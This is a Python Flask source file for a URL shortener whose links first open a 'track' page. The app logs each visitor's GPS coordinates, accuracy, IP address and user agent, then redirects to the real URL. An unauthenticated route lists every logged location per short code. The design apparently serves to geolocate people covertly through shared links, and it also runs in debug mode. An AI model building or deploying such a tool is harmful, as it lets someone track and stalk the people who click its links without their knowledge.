from flask import Flask, request, jsonify, render_template, redirect
import os
import uuid
import logging
from datetime import datetime

app = Flask(__name__)
app.config['DEBUG'] = True

logging.basicConfig(level=logging.INFO)

# PostgreSQL connection
DATABASE_URL = os.environ.get('DATABASE_URL')

if not DATABASE_URL:
    logging.error("DATABASE_URL not found!")
    DATABASE_URL = "sqlite:///database.db"  # fallback

import psycopg2
from psycopg2.extras import RealDictCursor

def get_db_connection():
    if DATABASE_URL.startswith('postgres'):
        conn = psycopg2.connect(DATABASE_URL)
    else:
        # Fallback for local testing
        import sqlite3
        conn = sqlite3.connect('database.db')
        conn.row_factory = sqlite3.Row
        return conn
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS links (
            id TEXT PRIMARY KEY,
            original_url TEXT NOT NULL,
            short_code TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            short_code TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip TEXT,
            user_agent TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ====================== ROUTES ======================

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/shorten', methods=['POST'])
def shorten():
    data = request.get_json()
    original_url = data.get('original_url')
    if not original_url:
        return jsonify({'error': 'URL is required'}), 400

    conn = get_db_connection()
    c = conn.cursor()
    
    for _ in range(5):
        short_code = str(uuid.uuid4())[:8].lower()
        try:
            c.execute('INSERT INTO links (id, original_url, short_code) VALUES (%s, %s, %s)',
                      (str(uuid.uuid4()), original_url, short_code))
            conn.commit()
            short_url = f"{request.host_url.rstrip('/')}/{short_code}"
            conn.close()
            return jsonify({'short_url': short_url, 'short_code': short_code})
        except Exception:
            continue
    conn.close()
    return jsonify({'error': 'Failed to create short code'}), 500

@app.route('/<short_code>')
def track(short_code):
    return render_template('track.html', short_code=short_code.strip().lower())

@app.route('/api/track/<short_code>', methods=['POST'])
def log_location(short_code):
    short_code = short_code.strip().lower()
    data = request.get_json() or {}

    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('SELECT original_url FROM links WHERE short_code = %s', (short_code,))
    if not c.fetchone():
        conn.close()
        return jsonify({'error': 'Link not found'}), 404

    c.execute('''
        INSERT INTO logs (short_code, latitude, longitude, accuracy, ip, user_agent)
        VALUES (%s, %s, %s, %s, %s, %s)
    ''', (short_code, data.get('latitude'), data.get('longitude'),
          data.get('accuracy'), request.remote_addr, request.headers.get('User-Agent')))
    
    conn.commit()
    conn.close()
    return jsonify({'status': 'logged'})

@app.route('/redirect/<short_code>')
def final_redirect(short_code):
    short_code = short_code.strip().lower()
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT original_url FROM links WHERE short_code = %s', (short_code,))
    result = c.fetchone()
    conn.close()
    
    if result:
        return redirect(result[0] if isinstance(result, dict) else result[0])
    return "Link not found", 404

@app.route('/logs/<short_code>')
def logs_page(short_code):
    return render_template('logs.html', short_code=short_code.lower())

@app.route('/api/logs/<short_code>')
def get_logs(short_code):
    short_code = short_code.strip().lower()
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''
        SELECT latitude, longitude, accuracy, timestamp, ip, user_agent 
        FROM logs 
        WHERE short_code = %s 
        ORDER BY timestamp DESC
    ''', (short_code,))
    logs = c.fetchall()
    conn.close()
    
    return jsonify([dict(row) if hasattr(row, 'keys') else {
        'lat': row[0], 'lng': row[1], 'accuracy': row[2],
        'time': row[3], 'ip': row[4], 'user_agent': row[5]
    } for row in logs])

if __name__ == '__main__':
    app.run(debug=True, port=5000)
